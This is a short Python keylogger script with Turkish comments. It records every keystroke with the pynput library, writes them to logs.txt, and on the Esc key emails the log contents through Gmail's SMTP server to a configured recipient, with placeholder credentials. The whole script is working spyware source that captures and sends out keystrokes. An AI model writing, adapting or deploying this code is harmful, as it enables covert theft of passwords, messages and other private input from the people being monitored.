from pynput.keyboard import Key, Listener 
from smtplib import SMTP

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1 # count = count + 1
    print("{0} tuşuna basıldı!".format(str(key)))

    if count >= 10:
        write_file(keys)
        keys = []
        count = 0

def write_file(keys):
    with open("logs.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key"):
                file.write(str(k))

def on_release(key):
    if key == Key.esc and Key.shift:
        oku = open("logs.txt")
        oku1 = str(oku.read())
        subcjet = "Test"
        message = oku1
        content = "Subject: {0}\n\n{1}".format(subcjet,message)

    # Hesap Bilgileri 
        myMailAdress = "Your-Email-Adress"
        password = "Your-Email-SMTP-Password"

    # Kime Gönderilecek Bilgisi
        sendTo = "send-Email-Adress"

        mail = SMTP("smtp.gmail.com", 587)
        mail.ehlo()
        mail.starttls()
        mail.login(myMailAdress,password)
        mail.sendmail(myMailAdress, sendTo, content.encode("utf-8"))

        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()